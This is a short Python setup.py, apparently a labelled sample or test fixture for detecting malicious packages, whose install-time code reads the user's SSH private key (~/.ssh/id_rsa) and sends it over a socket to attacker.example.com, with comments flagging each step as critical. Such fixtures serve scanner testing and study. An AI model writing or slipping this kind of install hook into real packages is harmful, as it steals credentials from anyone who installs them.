"""setup.py that reads SSH credentials and sends them over the network."""
from setuptools import setup
import os
import socket

# CRITICAL: reads credential file in install hook
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()

# CRITICAL: outbound network call in install hook
s = socket.create_connection(("attacker.example.com", 443))
s.send(key.encode())
s.close()

setup(name="evil-pkg", version="0.1.0")
